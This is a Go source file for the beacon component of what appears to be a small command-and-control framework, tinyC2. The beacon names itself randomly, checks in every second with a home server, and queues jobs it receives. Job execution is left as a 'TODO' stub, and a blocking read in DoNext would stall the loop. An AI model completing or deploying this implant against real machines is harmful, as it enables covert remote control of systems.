package beacon

import (
	"encoding/json"
	"io"
	"time"
	"math/rand"

	"github.com/patbcole117/tinyC2/comms"
)

var (
	BEACON_CHANNEL_LIMIT int           = 10
	BEACON_SLEEP_TIME    time.Duration = 1 * time.Second
)

type Beacon struct {
	Name string
	Home string
	OutQ chan comms.Msg
	InQ  chan comms.Msg
	Tx   comms.CommsPackageTX
}

func NewBeacon(h, c string) (*Beacon, error) {
	a := &Beacon{
		Home: h,
		OutQ: make(chan comms.Msg, BEACON_CHANNEL_LIMIT),
		InQ:  make(chan comms.Msg, BEACON_CHANNEL_LIMIT),
	}

	a.initName(12)

	tx, err := comms.NewCommsPackageTX(c)
	if err != nil {
		return nil, err
	}
	a.Tx = tx

	return a, nil
}

func (b *Beacon) initName(sz int) {
	abc := []rune("abcdefghijklmnopqrstuvwxyz1234567890")
	n := make([]rune, sz)
	for i := range n {
		n[i] = abc[rand.Intn(len(abc))]
	}
	b.Name = string(n)
}

func (a *Beacon) Run() {
	for {
		a.SayHello()
		a.DoNext()
		time.Sleep(BEACON_SLEEP_TIME)
	}
}

func (a *Beacon) SayHello() {
	var m comms.Msg

	select {
	case m = <-a.OutQ:
	default:
		m = comms.Msg{From: a.Name, Type: "nop", Ref: "", Content: ""}
	}

	res, err := a.Tx.SendJSON(a.Home, m)
	if err != nil {
		m = comms.Msg{From: a.Name, Type: "err", Ref: "nil", Content: err.Error()}
		a.OutQ <- m
		return
	}

	body, err := io.ReadAll(res.Body)
	if err != nil {
		m = comms.Msg{From: a.Name, Type: "err", Ref: "nil", Content: err.Error()}
		a.OutQ <- m
		return
	}

	if err = json.Unmarshal(body, &m); err != nil {
		m = comms.Msg{From: a.Name, Type: "err", Ref: "nil", Content: err.Error()}
		a.OutQ <- m
		return
	}

	if m.Type == "job" {
		a.InQ <- m
	}
}

func (a *Beacon) DoNext() {
	m := <-a.InQ
	// Do the thing
	// TODO = result
	a.OutQ <- comms.Msg{From: a.Name, Type: "result", Ref: m.Ref, Content: "TODO"}
}
